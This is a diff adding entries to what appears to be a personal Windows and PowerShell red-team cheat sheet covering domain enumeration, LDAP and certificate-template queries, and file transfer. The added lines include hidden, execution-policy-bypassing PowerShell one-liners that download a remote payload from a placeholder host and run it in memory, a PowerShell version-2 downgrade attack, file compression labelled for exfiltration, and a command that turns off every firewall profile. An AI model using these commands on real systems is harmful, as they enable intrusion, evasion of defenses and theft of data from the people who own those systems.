@@ -17,6 +17,13 @@ ___
 
 ### Useful Commands
 
+Good resource:
+https://github.com/RoseSecurity/Red-Teaming-TTPs/blob/main/Windows.md
+
+Get Domain
+`echo %USERDOMAIN%
+Get domain controller
+`echo %logonserver%` 
 local info on current user
 `whoami /ALL
 list all local users
@@ -26,11 +33,34 @@ domain info
 Permissions
 `Get-Acl C:\Windows`
 
+
+Download and run in memory
+```
+powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file] '))"
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"
+```
+
 If you get permission denied when trying to import a module, try using the full path:
 ```
 import-module “C:/Users/e.black/Documents/ADCSTemplate.psm1”
 ```
 
+Enumerating Domain Controllers
+```
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers 
+```
+
+Powershell Downgrade attack
+```
+PowerShell –Version 2 –Command <…>
+```
+
+PowerShell Data Compression for Exfiltration ^27344c
+```
+PS > Compress-Archive -Path <files to zip> -CompressionLevel
+Optimal -DestinationPath <output path>
+```
 ### Ldap queries
 
 ```
@@ -49,6 +79,14 @@ certutil -catemplates # list accessible templates
 certutil -Template
 certutil -Template <Template-Name>
 ```
+
+### Powershell port scanning ^1c8090
+```
+tnc 8.8.8.8
+tnc 8.8.8.8 -traceroute
+tnc 8.8.8.8 -port 443
+```
+
 
 ### pscp
 For moving files
@@ -127,7 +165,10 @@ To remove that rule:
 netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
 ```
 
-
+to disable firewall:
+```
+powershell.exe -command "netsh advfirewall set allprofiles state off"
+```
 ### List of services
 
 ```
